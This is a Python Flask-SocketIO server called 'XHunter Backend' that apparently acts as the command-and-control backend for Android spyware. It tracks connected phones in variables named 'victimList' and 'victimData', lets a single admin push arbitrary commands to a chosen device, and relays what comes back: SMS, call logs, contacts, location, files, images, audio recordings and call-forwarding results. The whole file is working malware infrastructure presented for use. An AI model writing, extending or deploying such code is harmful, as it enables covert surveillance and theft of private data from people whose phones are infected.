#!/usr/bin/env python3
"""
XHunter Backend - Gevent Mode with Logging
"""

from gevent import monkey
monkey.patch_all()

from flask import Flask, request as flask_request, jsonify
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import json
import os
import sys
from datetime import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'xhunter-prod')
CORS(app)

socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='gevent',
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=100 * 1024 * 1024,
    transports=['websocket', 'polling'],
    logger=True,
    engineio_logger=True
)

PORT = int(os.environ.get('PORT', 10000))

victimList = {}
victimData = {}
adminSocketId = None

# Force flush print
sys.stdout.reconfigure(line_buffering=True)

@app.route('/')
def index():
    return jsonify({
        'server': 'XHunter Backend',
        'status': 'online',
        'devices': len(victimList),
        'admin': adminSocketId is not None,
        'time': datetime.now().isoformat()
    })

@app.route('/health')
def health():
    return jsonify({'status': 'ok'})

@app.route('/api/devices')
def api_devices():
    devices = []
    for dev_id, data in victimData.items():
        devices.append({
            'id': dev_id,
            'model': data.get('model', 'Unknown'),
            'android': data.get('android', 'Unknown'),
            'battery': data.get('battery', 0),
            'sim': data.get('sim', 'Unknown'),
            'online': True
        })
    return jsonify({'success': True, 'count': len(devices), 'devices': devices})

@socketio.on('connect')
def on_connect(auth=None):
    print(f"[CONNECT] {flask_request.sid}", flush=True)

@socketio.on('disconnect')
def on_disconnect(reason=None):
    global adminSocketId
    sid = flask_request.sid
    print(f"[DISCONNECT] {sid} | {reason}", flush=True)
    if sid == adminSocketId:
        adminSocketId = None
        print("[ADMIN] Left", flush=True)
        return
    for dev_id, sock_id in list(victimList.items()):
        if sock_id == sid:
            del victimList[dev_id]
            victimData.pop(dev_id, None)
            if adminSocketId:
                socketio.emit('disconnectClient', dev_id, to=adminSocketId)
            print(f"[DEVICE] {dev_id} left", flush=True)
            break

@socketio.on('adminJoin')
def on_admin_join():
    global adminSocketId
    adminSocketId = flask_request.sid
    print(f"[ADMIN] {adminSocketId} | Devices: {len(victimData)}", flush=True)
    for dev_id, data in list(victimData.items()):
        socketio.emit('join', data, to=adminSocketId)
    socketio.emit('adminConnected', {'victimCount': len(victimList)}, to=adminSocketId)

@socketio.on('join')
def on_device_join(data):
    sid = flask_request.sid
    dev_id = data.get('id', sid)
    victimList[dev_id] = sid
    victimData[dev_id] = {
        'id': dev_id,
        'model': data.get('model', 'Unknown'),
        'android': data.get('android', 'Unknown'),
        'battery': data.get('battery', 0),
        'sim': data.get('sim', 'Unknown'),
        'manufacture': data.get('manufacture', 'Unknown'),
        'socketId': sid,
        'online': True,
        'connectedAt': datetime.now().isoformat()
    }
    print(f"[DEVICE] JOINED: {dev_id} | {data.get('model', '?')} | Bat: {data.get('battery', '?')}%", flush=True)
    if adminSocketId:
        socketio.emit('join', victimData[dev_id], to=adminSocketId)
    socketio.emit('deviceRegistered', {'success': True, 'deviceId': dev_id}, to=sid)

@socketio.on('request')
def on_request(data):
    try:
        req = json.loads(data) if isinstance(data, str) else data
        to = req.get('to', '')
        action = req.get('action', '')
        payload = req.get('data', {})
        print(f"[CMD] {action} -> {to[:16]}", flush=True)
        if to not in victimList:
            if adminSocketId:
                socketio.emit('error', {'error': 'Device offline'}, to=adminSocketId)
            return
        payload_str = json.dumps(payload) if isinstance(payload, dict) else str(payload)
        socketio.emit(action, payload_str, to=victimList[to])
    except Exception as e:
        print(f"[ERR] {e}", flush=True)

def relay(event, data):
    if adminSocketId:
        socketio.emit(event, data, to=adminSocketId)

@socketio.on('getDir')
def r_dir(data): relay('getDir', data)
@socketio.on('getSMS')
def r_sms(data): relay('getSMS', data)
@socketio.on('getCallLog')
def r_call(data): relay('getCallLog', data)
@socketio.on('getContacts')
def r_con(data): relay('getContacts', data)
@socketio.on('getInstalledApps')
def r_app(data): relay('getInstalledApps', data)
@socketio.on('getLocation')
def r_loc(data): relay('getLocation', data)
@socketio.on('sendSMS')
def r_send(data): relay('sendSMS', data)
@socketio.on('download')
def r_dl(data): relay('download', data)
@socketio.on('previewImage')
def r_pre(data): relay('previewImage', data)
@socketio.on('callForwardResult')
def r_cf(data): relay('callForwardResult', data)
@socketio.on('audioRecording')
def r_audio(data): relay('audioRecording', data)
@socketio.on('audioRecordingStatus')
def r_astat(data): relay('audioRecordingStatus', data)
@socketio.on('vibrateResult')
def r_vib(data): relay('vibrateResult', data)
@socketio.on('torchResult')
def r_tor(data): relay('torchResult', data)
@socketio.on('error')
def r_err(data): relay('error', data)
@socketio.on('ping')
def on_ping(data=None):
    emit('pong', {'time': datetime.now().isoformat()})

if __name__ == '__main__':
    print(f"XHunter Backend - Port: {PORT}", flush=True)
    socketio.run(app, host='0.0.0.0', port=PORT, debug=False)
